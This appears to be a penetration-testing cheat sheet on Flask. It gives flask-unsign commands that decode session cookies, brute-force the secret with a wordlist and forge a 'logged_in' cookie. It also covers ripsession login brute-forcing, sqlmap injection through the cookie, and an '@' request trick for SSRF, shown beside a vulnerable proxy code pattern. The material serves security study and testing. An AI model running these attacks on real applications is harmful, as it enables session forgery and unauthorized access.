# Flask

## Cookies

Default cookie session name is **`session`**.

### Decoder

Online Flask cookies decoder: https://www.kirsle.net/wizards/flask-session.cgi

### Manual

Get the first part of the cookie until the first dot and Base64 decode it:

```bash
echo "ImhlbGxvIg" | base64 -d
```

The cookie is also signed using a password.

### Flask-Unsign

Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application.

```bash
pip3 install flask-unsign
```

### Decode Cookie

```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```

### Brute Force

```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```

### Signing

```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```

### Signing using legacy (old versions)

```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```

### RIPsession

Brute-force websites using cookies crafted with flask-unsign:

```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```

### SQLi in Flask session cookie with SQLmap

Uses sqlmap `eval` option to automatically sign sqlmap payloads for flask using a known secret.

## Flask Proxy to SSRF

Flask allows a request starting with the character "@":

```
GET @/ HTTP/1.1
Host: target.com
Connection: close
```

Vulnerable proxy pattern:

```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
  return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
